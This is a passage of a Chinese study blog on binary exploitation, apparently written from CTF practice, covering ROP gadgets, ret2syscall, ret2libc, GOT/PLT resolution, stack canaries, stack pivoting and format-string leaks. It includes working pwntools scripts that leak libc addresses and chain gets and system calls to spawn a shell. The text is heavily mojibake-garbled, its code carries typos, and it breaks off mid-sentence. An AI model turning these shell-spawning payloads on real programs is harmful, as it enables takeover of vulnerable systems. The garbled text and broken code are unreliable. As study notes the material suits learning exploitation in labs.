src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230325231231643.png" alt="image-20230325231231643"></p><p>åŠ¨æ€é“¾æ¥åº“æœ¬èº«å°±æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚<br>my_putså‡½æ•°è¾“å‡ºè¿‡ç¨‹ï¼ˆæ— å„æ ˆä¿æŠ¤å¯è€ƒè™‘ropï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409153211276.png" alt="image-20230409153211276"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409153739815.png" alt="image-20230409153739815"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409163357731.png" alt="image-20230409163357731"></p><p>ROPgadget è·å–textæ®µæ‰€éœ€æ±‡ç¼–ä»£ç ï¼ˆretâ€”â€”&gt;å°†æ ˆä¸­ä¿¡æ¯å¼¹åˆ°eipä¸­ï¼‰ eaxã€ebxä¼˜å…ˆã€ROPæ€»ä¼šè‡³æº¢å‡ºretaddråã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png" alt="image-20230409171200929"></p><p>å¼‚æˆ–ï¼ˆxorï¼‰å¸¸ç”¨äºæ¸…ç©ºç¼“å†²åŒº<br>flat()å‡½æ•° æ¥æ”¶ä¸€ä¸ªåˆ—è¡¨å‚æ•°å°†åˆ—è¡¨ä¸­çš„æ¯ä¸€é¡¹éƒ½è½¬ä¸ºå­—èŠ‚å‹æ•°æ®å¹¶ä¸”è‡ªåŠ¨æŠŠä¸è¶³ä¸€å­—èŠ‚æ•°æ®è¿›è¡Œå¡«è¡¥</p><pre><code>io = flatï¼ˆ[b&#39;A&#39;*112,pop_eax_ret,0xb,pop_eax_ecx_ebx_ret,0,0,bin_sh,int_80h]ï¼‰</code></pre><p>grepåŠŸèƒ½ï¼šå¯¹è¾“å…¥è¡Œä¸­å«æœ‰ç”¨æˆ·è‡ªå®šå‚æ•°çš„è¡Œè¿›è¡Œå…¨éƒ¨è¾“å‡º</p><pre><code>ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; | head</code></pre><p>sos æ•‘å¤§å‘½è¸©å‘ï¼ï¼ï¼è¾“å…¥æ ¼å¼æˆ‘å“­æ­»&#x2F;(ã„’oã„’)&#x2F;<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png" alt="image-20230410210009493"></p><pre><code>ROPgadget  --binary ret2syscall --only &quot;pop|ret&quot; | grep eax</code></pre><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230410194103144.png" alt="image-20230410194103144"></p><pre><code>ROPgadget --binary æ–‡ä»¶å --only &quot;int&quot;(æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ å½“ä¸º0x80æ—¶ä¸­æ–­ç»“æŸ0x80è¡¨ç¤ºè¿›è¡Œç³»ç»Ÿè°ƒç”¨çš„call)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410201002577.png" alt="image-20230410201002577"></p><p>python3ä¸­å¿…é¡»ç”¨bè½¬æ¢ä¸ºå­—èŠ‚æµå‹æ•°æ® generatorè½¬æ¢å™¨ nextï¼ˆï¼‰å‡½æ•°ï¼ˆå‰+hexè½¬ä¸ºåå…­è¿›åˆ¶ï¼‰ï¼ï¼è½¬åŒ–ä¸ºåè¿›åˆ¶æ•°æ®wwå…¶å®ä¸å¦‚ROPgadgetæ¥çš„æ–¹ä¾¿å–½ï¼ˆç›®å‰ä¸ªäººè§‰å¾—ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412210903759.png"></p><pre><code>ROPgadget --binary æ–‡ä»¶å --string &#39;/bin/sh&#39; (æŸ¥è¯¢åé—¨åœ°å€)</code></pre><p>ret2text ret2shellcode å‡ç›´æ¥å«æœ‰åé—¨å‡½æ•° ret2text è‡ªæ¥æ”¶ä¸€ä¸²base64è§£ç å¾—flag ret2shellcode</p><pre><code>sys_execve() -&gt;0xb</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412204604894.png" alt="image-20230412204604894"><br>å†…æ ¸ç³»ç»Ÿè°ƒç”¨å‡½æ•°å                            ç”¨æˆ·è°ƒç”¨ä»£å·<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214823229.png" alt="image-20230412214823229"></p><p>é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214936627.png" alt="image-20230412214936627"></p><p>åŒºåˆ«ï¼š<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412215132315.png" alt="image-20230412215132315"></p><p>é™æ€é“¾æ¥æ–¹ä¾¿æ‰¾åˆ°gadgetï¼šé™æ€é“¾æ¥å°†åº“å‡½æ•°å…¨éƒ¨å†™å…¥elfæ–‡ä»¶æœ¬èº« å®¹æ˜“ç”¨æŒ‡é’ˆç‰‡æ®µæ„æˆæ”»å‡»æµ<br>åŠ¨æ€é“¾æ¥åªæ˜¯åšäº†æ ‡è®°ï¼Œç”¨å³æ‹¿ï¼ˆåˆ«å¤„å€Ÿxxä¾‹ï¼šprintfè°ƒç”¨vprintfã€2000å¤šè¡Œ è¿˜è¦å†è°ƒå“äººçš„å˜ã€‘ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230413185604877.png" alt="image-20230413185604877"></p><p>é™æ€é“¾æ¥åœ¨é“¾æ¥æ—¶è¿›è¡Œ åŠ¨æ€é“¾æ¥åœ¨è£…è½½æ—¶è¿›è¡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414210446532.png" alt="image-20230414210446532"></p><p>putså‡½æ•°åŠ¨æ€é“¾æ¥åœ¨å¯æ‰§è¡Œæ®µcodeè½½å…¥ï¼ˆåªä¸ºè™šæ‹Ÿå†…å­˜åœ°å€ã€libcå…¨è½½å…¥ã€‘ä½†å¹¶ä¸çŸ¥çœŸå®åœ°å€ï¼‰åœ¨è¿è¡Œæ—¶å¯æ‰¾æ­¤æ—¶pltç»“è§£æä½¿å¾—putså†…å®¹å¡«å…¥dataæ®µgot.pltæ–‡ä»¶ã€pltåœ¨ä»£ç æ®µ gotåœ¨æ•°æ®æ®µã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414212714060.png" alt="image-20230414212714060"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214750326.png" alt="image-20230414214750326"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214800705.png" alt="image-20230414214800705"></p><pre><code>gcc -fro-pie -g -m32 -o link åŠ¨æ€é“¾æ¥æ–‡ä»¶å(32ä½)gcc -fro-pie -g -0 link åŠ¨æ€é“¾æ¥æ–‡ä»¶åï¼ˆ64ä½ï¼‰</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png"></p><p>æŸ¥çœ‹plt  x åœ°å€â€”â€”&gt;ä»¥äºŒè¿›åˆ¶å½¢å¼æŸ¥çœ‹</p><pre><code>pwndbg disass åœ°å€-&gt;åæ±‡ç¼–</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png" alt="image-20230414222605298"></p><p>info b æŸ¥çœ‹æ–­ç‚¹ä¿¡æ¯  b è¡Œå·å¯ä¸‹æ–­ç‚¹ï¼ˆå«Cä»£ç æƒ…å†µä¸‹ï¼‰ d è¡Œå·å¯åˆ é™¤æ–­ç‚¹ã€æ— Cè¯­è¨€ b åœ°å€ä¸‹æ–­ç‚¹ã€‘<br>c é‡åˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹&#x2F;è¾“å…¥ï¼ˆputsï¼‰&#x2F;ç¨‹åºä¸­æ–­ </p><pre><code>b main == start ã€è‹¥æ— mainå‡½æ•°åˆ™åœåœ¨ç¨‹åºå…¥å£ç¬¬ä¸€æ¡ï¼ˆstartæ‰ä¸ºç¨‹åºå…¥å£ï¼‰ã€‘s æ­¥è¿› n æ­¥è¿‡backtrace å‡½æ•°è°ƒç”¨æ ˆã€å‘ˆç°ç¥–å­™å…³ç³»ï¼ˆğŸ˜€ï¼‰ã€‘return ç›´æ¥å›åˆ°mainå‡½æ•°</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415092539078.png" alt="image-20230415092539078"></p><pre><code>void secure()&#123;  unsigned int v0; // eax  int input; // [esp+18h] [ebp-10h] BYREF  int secretcode; // [esp+1Ch] [ebp-Ch]  v0 = time(0);  srand(v0);  secretcode = rand();  __isoc99_scanf(&quot;%d&quot;, &amp;input);  if ( input == secretcode )    system(&quot;shell!?&quot;);&#125; //æ­¤å¤„systemå‡½æ•°è™½æ— åé—¨ ä½†æä¾›system pltè¡¨è±¡ ä½¿å¾—åœ¨textä¸­å¯è‡ªåŠ¨å°†æ‰§è¡Œæµæ‹‰å…¥libcæ®µ</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png" alt="image-20230418124940615"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png" alt="image-20230415100827595"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415101652128.png" alt="image-20230415101652128"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415112529947.png" alt="image-20230415112529947"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415114324006.png" alt="image-20230415114324006"></p><p>amd64å‘ä¸‹å…¼å®¹x86æ•…å«æœ‰eax<br>å‡½æ•°<strong>è°ƒç”¨æ ˆ</strong>åœ°å€ä»é«˜åœ°å€å‘ä½åœ°å€å¢é•¿ã€æ›´å¥½çš„åˆ©ç”¨è™šæ‹Ÿå†…å­˜ç©ºé—´ã€‘ï¼ˆå¯„å­˜å™¨ä¸ºä½åœ°å€å‘é«˜åœ°å€å¢é•¿å³å…ˆå…¥åå‡ºï¼‰</p><p>ã€åç»­ç”»å›¾è¡¥å…… å¥½æ‡’ï¼ˆæˆ‘çœŸè¯¥æ­»å•Š å¿˜äº†çš„æ—¶å€™å°±çŸ¥é“åŠ¨æ‰‹è®°å½•äº†ğŸ˜¶ï¼‰ã€‘<strong>èµç½ªå½•ï¼š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418130159741.png" alt="image-20230418130159741"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418132149276.png" alt="image-20230418132149276">ç”»çš„å¤ªæ’‡äº†ï¼ˆç¬‘ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418132737386.png" alt="image-20230418132737386"></p><p>æ‰§è¡Œå®Œè°ƒç”¨è¿”å›dyntestï¼ˆå‡åœ¨å†…å­˜ç©ºé—´ä¸­ï¼‰</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418133451380.png" alt="image-20230418133451380"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418205450196.png" alt="image-20230418205450196"></p><p><strong>ã€è°ƒç”¨æµç¨‹ä¸¤ç‚¹éœ€æ³¨æ„ã€‘</strong>ï¼ˆx86ä¾‹ï¼‰</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418212246848.png" alt="image-20230418212246848"></p><p>fatherä¸­ä¹Ÿå«æœ‰å­å‡½æ•°æ‰€éœ€arg<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418213125953.png" alt="image-20230418213125953"></p><p>æŸ¥è¡¨æ˜“çŠ¯é”™è¯¯ï¼ˆç›´æ¥è°ƒgotï¼‰</p><pre><code>ret = system@got(âŒ)</code></pre><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419201116801.png" alt="image-20230419201116801"></p><pre><code>elf = ELF(&quot;./dyntest&quot;)[  æ–‡ä»¶å½¢å¼åŠä¿æŠ¤]elf.got[&quot;puts&quot;]//è·å–å‡½æ•°è¡¨è±¡åœ°å€hex(elf.got[&quot;puts&quot;])//è·å–å‡½æ•°çœŸå®åœ°å€</code></pre><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419203107813.png" alt="image-20230419203107813"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419215529699.png" alt="image-20230419215529699"></p><p>ã€nop slideã€‘<br>ä½¿å¾—ASLRç»§ç»­æ‰§è¡Œret2shellcode<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423182143460.png" alt="image-20230423182143460"></p><p>ä½¿æ‰§è¡Œæµä¸€ç›´åœ¨nopæ®µï¼ˆmaybeè¿æ°”ä¸å¥½eipæŒ‡ä¸åˆ°nopä½ç½® å¤šè¿è¡Œå‡ æ¬¡å³å¯ï¼‰<br>coreæ–‡ä»¶ï¼šè®°è½½ç¨‹åºå´©æºƒæ—¶æ–­ç‚¹ä¿¡æ¯åŠé”™è¯¯ä¿¡æ¯<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230423193313158.png" alt="image-20230423193313158"></p><p>å¯ä»¥çœ‹æˆè°æ”¾çš„æ•°æ®å°±ä¸ºè°çš„æ ˆå¸§<br>å‡½æ•°å¾€ä¸Šç¬¬äºŒä¸ªå­—é•¿å†™å…¥å…¶æ‰€éœ€è¦çš„å‚æ•°ï¼ˆå¤§éƒ¨åˆ†å‡½æ•°ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194347199.png" alt="image-20230423194347199"></p><p>systemè°ƒç”¨ret addråè‡ªåŠ¨pushçˆ¶å‡½æ•°ebpã€å‡½æ•°å†…æ±‡ç¼–ç¬¬ä¸€æ­¥push ebpå‡å‘ä¸Šå†™ä¸¤å­—é•¿åˆ°valuableã€‘<br>æœ€åä¸¤ä¸ªå‡½æ•°æ‰§è¡Œæ­¤ç±»æ¨¡å¼å³å¯å®Œæˆæ”»å‡»</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194601499.png" alt="image-20230423194601499"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194754995.png" alt="image-20230423194754995"></p><p>ropé“¾å°†å‡½æ•°æ‰€éœ€å‚æ•°ç›´æ¥å†™å…¥åˆ°ä¸Šä¸€å‡½æ•°çš„è¿”å›åœ°å€å¤„<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424192129082.png" alt="image-20230424192129082"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424194313669.png" alt="image-20230424194313669"></p><p>æ— â€&#x2F;bin&#x2F;shâ€ä¹Ÿå¯æ˜ å°„ systemå‡½æ•°åœ°å€ï¼ˆtextæ®µ pltï¼‰è‹¥æ— pltåˆ™éœ€æŒç»­æº¢å‡ºç›´è‡³å‡ºç°çœŸå®åœ°å€<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195822728.png"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195913266.png"></p><p>æˆ‘æ˜¯å°å· æ— éœ€exitï¼ˆï¼‰ã€å·å®Œå°±è·‘ã€‘ğŸ¤­</p><pre><code>strings ret2libc1 | grep /bin/sh//string a.out | grep flag(ç®€å•é€†å‘)</code></pre><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424200850159.png" alt="image-20230424200850159"></p><p>ã€ret2libc1ã€‘<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424205359479.png" alt="image-20230424205359479"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424204704035.png" alt="image-20230424204704035"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424205428601.png" alt="image-20230424205428601">å°å°ç¨‹åºå‘˜&gt;&lt;<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424210938062.png" alt="image-20230424210938062"></p><p>åŠ¨æ€è°ƒè¯•108+4ï¼ˆebpï¼‰æº¢å‡ºã€ret2libc2ã€‘<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425125354842.png" alt="image-20230425125354842"></p><p>æ— â€œ&#x2F;bin&#x2F;shâ€ æ­¤æ—¶éœ€è‡ªè¡Œæ„é€  åœ¨bssæ®µæ‰¾åˆ°å¯å†™å…¥éƒ¨åˆ† </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425125119149.png" alt="image-20230425125119149">         </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425153257042.png" alt="image-20230425153257042"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230426210301792.png" alt="image-20230426210301792"></p><p>è¿›é˜¶ç‰ˆæ€è·¯</p><pre><code class="python">from pwn import *io = process(&quot;./ret2libc2&quot;)gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat([b&#39;a&#39;*112,gets_plt,pop_ebx,buf2,system_plt,0xdeadbeef(pop_ebx),buf2])#ç¬¦åˆretçš„å¯„å­˜å™¨å‡å¯ä¸ä¸€å®šä¸€å®šæ˜¯pop_ebxio.seneline(payload)io.sendline(b&#39;/bin.sh&#39;)io.interactieve()</code></pre><p>ã€ret2libc3ã€‘</p><pre><code class="python"> v8 = strtol(&amp;buf, v4, v5); å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•´æ•°å­˜å‚¨åœ¨v8é‡Œ long int strtol(const char *str, char **endptr, int base)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202338093.png" alt="image-20230427202338093"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202101873.png" alt="image-20230427202101873"><br>æ³¨æ„æˆ‘ä»¬è¾“é€sendçš„å€¼è¦ç”¨strã€ç¨‹åºæ¥æ”¶çš„æ€»æ˜¯strã€‘ linuxç³»ç»Ÿä¸‹æœ€å°å•ä½ä¸€å¶ï¼ˆ4kbï¼‰<br>&#x2F;bin&#x2F;sh(é€šè¿‡ç»å¯¹åœ°å€è¾“å…¥binä¸­çš„sh)&#x3D;&#x3D;sh</p><pre><code class="python">from pwn import *io = process(&quot;./ret2libc3&quot;)elf = ELF(&quot;./ret2libc3&quot;)libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)#lld ret2libc3æŸ¥çœ‹æœ¬åœ°libc(åŠ¨æ€)io.sendlineafter(b&quot; :&quot;,str(elf.got[&quot;puts&quot;]))#é˜²bugä¸ç¨‹åºä¿æŒä¸€è‡´io.recvuntil(b&quot; :&quot;)libcBase = int(io.recvuntil(b&quot;\n&quot;,drop=True),16) - libc.symbols[&quot;puts&quot;]#drop=Trueä¸ä¿ç•™è¿”å›å€¼ï¼ˆæ­¤å¤„ä¸ºæ¥æ”¶ä½†ä¸ä¿ç•™\nï¼‰success(&quot;libcBase -&gt;&#123;:#x&#125;&quot;,format(libcBase))#ç”¨æ¥debug ç»“æœæ­£ç¡®åè¿›è¡Œæ‰“å° &#123;:#&#125;æ ¼å¼åŒ–å­—ç¬¦ä¸²#formatè½¬æ¢æ ¼å¼ å‰xè¡¨ç¤ºè½¬æ¢ä¸ºåå…­è¿›åˆ¶#oneGadget = libcBase + 0x3a9fc#payload = flat(cyclic(60),oneGadget)payload=flat(cyclic(60),libcBase+libc.symbols[&quot;system&quot;],0xdeadbeef,next(elf.search(b&quot;sh\x00&quot;)))io.sendlineafter(b&quot; :&quot;,payload)io.interactive()</code></pre><p>åç§»ï¼šæ–‡ä»¶æŸä¸€ä¸ªä½ç½®è·æ–‡ä»¶å¼€å¤´ç¬¬ä¸€ä¸ªå­—èŠ‚è·ç¦»</p><pre><code>one_gadget libc-2.23.so(åŠ¨æ€é“¾æ¥æ–‡ä»¶å)-&gt;å¾—åç§»é‡ #ç¢°è¿æ°”å–½ğŸ˜€</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230428193230160.png" alt="image-20230428193230160"></p><p>gdbè°ƒè¯•<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230511094407053.png" alt="image-20230511094407053"></p><pre><code>set follow-fork-mode-parent è§£å†³è¯¥é—®é¢˜ï¼ˆgdbä¸­ï¼‰</code></pre><p>x64ç¯å¢ƒä¸‹ä¼ å‚è¦å…ˆä¼ å…¥å…­ä¸ªå¯„å­˜å™¨ä¸­ï¼ˆrdi rsi rdx rcx r8 r9 ï¼‰<br>åŠ«æŒç¨‹åºè¿”å›åˆ°ç›®çš„å‡½æ•°ä¹‹å‰è¦å…ˆæŠŠç›®çš„å‡½æ•°çš„å‚æ•°ä¼ é€’å®Œæ¯•ï¼ˆå³ä¼ é€’å‚æ•°çš„gadgetæ”¾åœ¨ç›®æ ‡å‡½æ•°ä¹‹å‰ï¼‰ä»»ä½•æ—¶å€™æ•°æ®çš„å†™å…¥éƒ½æ˜¯ä»ä½åœ°å€å‘é«˜åœ°å€å†™å…¥<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520224921532.png" alt="image-20230520224921532"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520225916659.png" alt="image-20230520225916659"></p><p>ä¸€èˆ¬æœ‰jzè·³è½¬æç¤ºï¼ˆä¸€é•¿ä¸²pop å¯„å­˜å™¨ï¼‰**[lib_csu]**</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230522173452594.png" alt="image-20230521000849599"></p><p>æ³¨æ„çœ‹åœ°å€ï¼ˆå¦‚å›¾ä¸­ediåªå¯å†™ä½å…«ä½ï¼‰<br>libcæ³„éœ²æŠ€å·§ï¼šæ‰¾åˆ°å…³é”®å‡½æ•°ï¼ˆå¦‚writeã€è¿”å›æ—¶æœ‰æ ˆæº¢å‡ºã€‘ï¼‰å¯¹åº”çš„çš„pltä¸‹got ç”¨å‡½æ•°çš„çœŸå®åœ°å€-å‡½æ•°åœ¨libcä¸­çš„åœ°å€&#x3D;libcåŸºåœ°å€ -&gt;æ‰¾system+â€œ&#x2F;bin&#x2F;shâ€åç§»ä¼ å…¥æ³„éœ²<br>ã€level3ã€‘<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230522173452594.png" alt="image-20230522173452594"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523002237695.png"></p><p>å­¦ä¼šç”¨è½¬æ¢æio.recv(4&#x2F;8)</p><h3 id="ã€èŠ±å¼æ ˆæº¢å‡ºã€‘"><a href="#ã€èŠ±å¼æ ˆæº¢å‡ºã€‘" class="headerlink" title="ã€èŠ±å¼æ ˆæº¢å‡ºã€‘"></a><strong>ã€èŠ±å¼æ ˆæº¢å‡ºã€‘</strong></h3><p>1.ç¨‹åºä¸­æ— çœŸæ­£mainå‡½æ•°ï¼ˆdynï¼‰<br>start-&gt;libc_start_mian-&gt;init-&gt;main<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523101555442.png" alt="image-20230523101555442"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523101634224.png" alt="image-20230523101634224"></p><p>æ­¤æ—¶æ ˆä¸­æ— æ ˆå¸§ å…¨éƒ¨å­˜å‚¨çš„shellé‡Œçš„ç¯å¢ƒå˜é‡ å…¶ä¸­è®°å½•äº†å½“å‰æ‰§è¡Œç¨‹åºçš„åå­—<br>æ‰¾ç¨‹åºå…¥å£ï¼šIDAï¼ˆå¯çˆ±å¥³äººï¼‰mainåœ°å€ gdbzhoä¸­ä¸‹æ–­ç‚¹è°ƒè¯• stackæŸ¥çœ‹æ ˆå¸§<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523104215828.png" alt="image-20230523104215828"></p><p>checksecc å‘ç°canaryæ‰“å¼€ <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523104710354.png" alt="image-20230523104710354"></p><p>è¿è¡Œç¨‹åº æ‰‹åŠ¨è¶…é•¿æº¢å‡ºï¼ˆå¯åˆ©ç”¨pythonï¼‰æŸ¥çœ‹æç¤º ã€å¯ä»IDAä¸­è¾…åŠ©åˆ†æã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523105629335.png" alt="image-20230523105629335"></p><p>ä¹‹å‰ä¸ºsegment fault ç°whyä¸ºstack samshing<br>è¦†ç›–åè§¦å‘stack_chk_failå‡½æ•° å¼ºè¡Œé€€å‡ºç¨‹åº -&gt;stack smashing</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523114523470.png" alt="image-20230523114523470"><br>å¦‚ä½•åœ¨å¯çˆ±å¥³äººä¸­è§‚å¯Ÿåˆ°Canaryï¼Ÿ<br>æ ‡å¿—ï¼šæ®µå¯„å­˜å™¨è¯»å…¥</p><pre><code>v4 = _readfsqword(0x28) //ğŸŒ°</code></pre><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230523122130079.png" alt="image-20230523122130079"></p><p>Canaryæ”¾ç½®æ— ç¡¬æ€§æ ‡å‡† éœ€åˆ†æ<br>elfæ–‡ä»¶è¾ƒå°æ—¶ åœ°å€å¯èƒ½åœ¨è™šæ‹Ÿåœ°å€ä¸­æ˜ å°„ä¸¤ä»½<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610163822498.png" alt="image-20230610163822498"></p><p>stripå»æ‰å‡½æ•°åâ€”â€”&gt;é˜²æŠ¤ç¨‹åº ï¼ˆIDAä¸­è‡ªåŠ¨ç”¨åç§»ä½œä¸ºå‡½æ•°åï¼‰<br>æ­¤æ—¶æ— â€œmainâ€å‡½æ•°ã€gdbä¸­æ–­ç‚¹ä¸‹ä¸äº†ã€‘</p><p><strong>ã€æ ˆè¿ç§»ã€‘</strong></p><p>èŠ±æ ·å¾ˆå¤šå•¦ æ ˆæ¬ºéª—<br>åˆ©ç”¨gadgetè¦†ç›–ebp æ¶æ„ä»£ç å†™åœ¨ebpä¸­ã€pop ret&#x2F;mov espï¼Œebpã€‘ebpè¾…ä½esp<br>espæŠ¹é™¤æ•°æ® ebpå¢åŠ  æ§åˆ¶espå³å¯<br><strong>pwn3_x64</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610182043459.png" alt="image-20230610182043459"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610182053082.png" alt="image-20230610182053082"></p><p>writeç¬¬ä¸‰ä¸ªå‚æ•°æ— æ³•è·å–æ—¶ è¿æ°”ï¼ˆçŒœrdx&gt;8ï¼‰</p><p>retéœ€è¦ç»™æ˜¾ç¤ºå±å³æ ‡å‡†è¾“å‡º 1æ˜¯æ ‡å‡†è¾“å‡ºçš„ä»£å·</p><p><strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²</strong>ï¼ˆä¿å­˜åœ¨æ ˆä¸Šï¼‰</p><pre><code class="c">#include &lt;stdio.h&gt;int main()&#123;char s[100];int a = 1;int b = 0x22222222;int c = -1;scanf(&quot;%s&quot;,s);printf(&quot;%08x.%08x.%08x.%s\n&quot;,a.b,c,s);//ç¬¬ä¸€ä¸ªå‚æ•°å³ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆ%08x.ï¼‰printf(s);return 0;&#125;</code></pre><p>ä¸ç»™å‚æ•°æƒ…å†µä¸‹ ä¼šç›´æ¥å°†æ ˆä¸­å†…å®¹è¿›è¡Œæ‰“å°</p><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ”»é˜²ä¸­printfï¼ˆâ€%s%s%s(è¶³å¤Ÿé•¿å³å¯ä½¿å¾—ç¨‹åºå´©æºƒ)â€ï¼‰</p><p><strong>å­—ç¬¦ä¸²æˆªæ–­æ¼æ´ä¸»ä½“åˆ©ç”¨æ€æƒ³</strong>ï¼š</p><p> æˆªæ–­ç¬¦çš„ç¯¡æ”¹æˆ–æŠ¹å»ï¼ˆè®©å‡½æ•°è¯¯è§£ç¨‹åºæœªæ‰§è¡Œå®Œæ¯•ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225648504.png" alt="image-20230615225648504"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225717582.png" alt="image-20230615225717582"></p><pre><code>%pæº¢å‡º---&gt;å®é™…å°†æ ˆä¸Šé‡è¦æ•°æ®è¿›è¡Œæ‰“å°ï¼ˆå¦‚åœ°å€ï¼‰å¯ç”¨äºç»•è¿‡canary%sæº¢å‡º---&gt;è§£ææ ˆæ‰“å°å…¶ä¸­å†…å®¹ ---&gt;æ³„éœ²ä»»æ„åœ°å€æ³„éœ²ä»»æ„åœ°å€ï¼š1.æ³„éœ²æ ˆä¸Šæœ¬èº«å­˜åœ¨çš„åœ°å€ï¼ˆå¦‚read@gotï¼‰2.æ³„éœ²åƒåœ¾æ•°æ®ï¼ˆç¯¡æ”¹å–½ï¼‰å†read@got</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615232327380.png" alt="image-20230615232327380"></p><p>ä¸ºé¿å…flagå’Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå‚æ•°è·ç¦»å¾ˆè¿œç›´æ¥ä¼ 